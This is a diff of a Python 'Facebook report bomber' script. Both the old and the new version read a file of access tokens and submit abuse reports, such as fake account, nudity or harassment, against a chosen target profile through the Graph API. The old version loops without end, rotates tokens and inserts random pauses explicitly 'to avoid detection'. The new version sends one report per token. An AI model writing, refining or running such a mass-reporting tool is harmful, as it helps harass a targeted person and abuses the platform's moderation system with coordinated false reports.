@@ -1,110 +1,102 @@
 import requests
 import time
-import random
-from colorama import Fore, init
-init(autoreset=True)
+from rich.console import Console
+from rich.progress import Progress, SpinnerColumn, TextColumn
+from rich.panel import Panel
+from rich.text import Text
+from rich.prompt import Prompt, IntPrompt
 
-def banner():
-    print(Fore.GREEN + """
- ███╗   ██╗ █████╗ ██████╗ ███████╗███████╗███╗  ███╗
- ████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗ ████║
- ██╔██╗ ██║███████║██║  ██║█████╗  █████╗  ██╔████╔██║
- ██║╚██╗██║██╔══██║██║  ██║██╔══╝  ██╔══╝  ██║╚██╔╝██║
- ██║ ╚████║██║  ██║██████╔╝███████╗███████╗██║ ╚═╝ ██║
- ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝
-             🔥 FACEBOOK REPORT BOMBER (SAFE) 🔥
-    """)
+console = Console()
+
+# Nadeem.Name Logo ASCII Art
+LOGO = r"""
+███████╗ █████╗ ██████╗ ████████╗███████╗███╗   ███╗
+██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝████╗ ████║
+█████╗  ███████║██████╔╝   ██║   █████╗  ██╔████╔██║
+██╔══╝  ██╔══██║██╔═══╝    ██║   ██╔══╝  ██║╚██╔╝██║
+██║     ██║  ██║██║        ██║   ███████╗██║ ╚═╝ ██║
+╚═╝     ╚═╝  ╚═╝╚═╝        ╚═╝   ╚══════╝╚═╝     ╚═╝
+                 [bold yellow]by Nadeem.Name[/bold yellow]
+"""
+
+REASONS = {
+    "1": "Fake Account",
+    "2": "Nudity",
+    "3": "Spam",
+    "4": "Harassment",
+    "5": "Hate Speech"
+}
 
 def send_report(token, target_id, reason):
-    headers = {
-        "Authorization": f"OAuth {token}",
-        "Content-Type": "application/x-www-form-urlencoded"
-    }
+    url = f"https://graph.facebook.com/{target_id}/reports"
     data = {
-        "report_type": reason,
-        "object": target_id,
-        "feedback_source": "profile"
+        'access_token': token,
+        'reason': reason
     }
     try:
-        res = requests.post("https://graph.facebook.com/me/report", headers=headers, data=data, timeout=10)
-        if res.status_code == 200:
-            print(Fore.GREEN + f"[✓] REPORT SENT: Token ...{token[-5:]}")
-            with open("log.txt", "a") as log:
-                log.write(f"Reported ID: {target_id} | Reason: {reason} | Token: {token[:15]}...\n")
+        response = requests.post(url, data=data)
+        if response.status_code == 200:
             return True
         else:
-            print(Fore.RED + f"[✗] FAILED (Status {res.status_code}): Token ...{token[-5:]}")
             return False
-    except requests.exceptions.RequestException as e:
-        print(Fore.YELLOW + f"[!] NETWORK ERROR: {e} | Token ...{token[-5:]}")
+    except Exception:
         return False
 
 def main():
-    banner()
-    target_id = input(Fore.CYAN + "[🎯] ENTER TARGET UID OR PROFILE LINK: ").strip()
+    console.clear()
+    console.print(Panel.fit(Text(LOGO, justify="center"), border_style="yellow"))
 
-    print(Fore.CYAN + "\n[1] Fake Account\n[2] Nudity\n[3] Spam\n[4] Harassment\n[5] Hate Speech")
-    reason_map = {
-        "1": "fake_account",
-        "2": "nudity",
-        "3": "spam",
-        "4": "harassment",
-        "5": "hate_speech"
-    }
-    reason_choice = input(Fore.CYAN + "[💥] SELECT REASON (1-5): ").strip()
-    reason = reason_map.get(reason_choice, "fake_account")
+    # Input token file
+    token_file = Prompt.ask("[bold green]Enter token file name[/bold green]", default="token.txt")
 
+    # Load tokens
     try:
-        base_delay = int(input(Fore.CYAN + "[⏱️] BASE DELAY BETWEEN REPORTS (in seconds): ").strip())
-        if base_delay < 3:
-            print(Fore.YELLOW + "[!] Minimum delay is 3 seconds. Setting delay to 3.")
-            base_delay = 3
-    except:
-        base_delay = 5
-        print(Fore.YELLOW + "[!] Default delay set to 5 seconds.")
-
-    try:
-        with open("token.txt", "r") as f:
-            tokens = [t.strip() for t in f if t.strip()]
-    except:
-        print(Fore.RED + "[✗] ERROR: token.txt file not found!")
+        with open(token_file, "r") as f:
+            tokens = [line.strip() for line in f if line.strip()]
+        if not tokens:
+            console.print("[red]Token file is empty![/red]")
+            return
+    except FileNotFoundError:
+        console.print(f"[red]File '{token_file}' not found![/red]")
         return
 
-    if not tokens:
-        print(Fore.RED + "[✗] No tokens found in token.txt!")
-        return
+    target_id = Prompt.ask("[bold cyan]Enter target Facebook ID to report[/bold cyan]")
 
-    print(Fore.MAGENTA + f"\n[🚀] Starting SAFE Auto Report on ID: {target_id}")
-    print(Fore.MAGENTA + f"[⚙️] Report Reason: {reason.upper()} | Base Delay: {base_delay}s\n")
+    # Select reason
+    console.print("\nSelect reason to report:")
+    for k, v in REASONS.items():
+        console.print(f"[yellow][{k}][/yellow] {v}")
+    reason_key = Prompt.ask("[bold magenta]Select reason (1-5)[/bold magenta]", choices=["1","2","3","4","5"])
 
-    count = 0
-    token_index = 0
-    start_time = time.time()
+    # Delay input
+    delay = Prompt.ask("[bold blue]Enter delay between reports (seconds)[/bold blue]", default="10")
+    try:
+        delay = float(delay)
+    except:
+        delay = 10
 
-    while True:
-        token = tokens[token_index]
-        success = send_report(token, target_id, reason)
-        if success:
-            count += 1
-            print(Fore.CYAN + f"[🔁] Total Reports Sent: {count}")
-        else:
-            print(Fore.YELLOW + "[!] Skipping token due to error.")
+    console.print(f"\n[bold green]Starting report process for target ID {target_id} with {len(tokens)} tokens...[/bold green]\n")
 
-        # Rotate tokens round-robin
-        token_index = (token_index + 1) % len(tokens)
+    success_count = 0
 
-        # Wait random delay (base_delay to base_delay + 4 seconds)
-        wait_time = base_delay + random.randint(0,4)
-        print(Fore.MAGENTA + f"[⏳] Waiting {wait_time} seconds before next report...")
-        time.sleep(wait_time)
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        transient=True,
+        console=console
+    ) as progress:
+        task = progress.add_task("[cyan]Sending reports...", total=len(tokens))
 
-        # Every 5 minutes, rest 10 seconds extra (to avoid rate limits)
-        elapsed = time.time() - start_time
-        if elapsed > 300:
-            print(Fore.MAGENTA + "[💤] Taking a short break for 10 seconds to avoid detection...")
-            time.sleep(10)
-            start_time = time.time()
+        for idx, token in enumerate(tokens, start=1):
+            result = send_report(token, target_id, reason_key)
+            if result:
+                success_count += 1
+                progress.update(task, description=f"[green]Report {idx}/{len(tokens)} sent successfully![/green]")
+            else:
+                progress.update(task, description=f"[red]Report {idx}/{len(tokens)} failed.[/red]")
+            time.sleep(delay)
 
+    console.print(f"\n[bold yellow]Reporting finished![/bold yellow] Successful reports: [bold green]{success_count}[/bold green] out of [bold]{len(tokens)}[/bold]")
 
 if __name__ == "__main__":
     main()
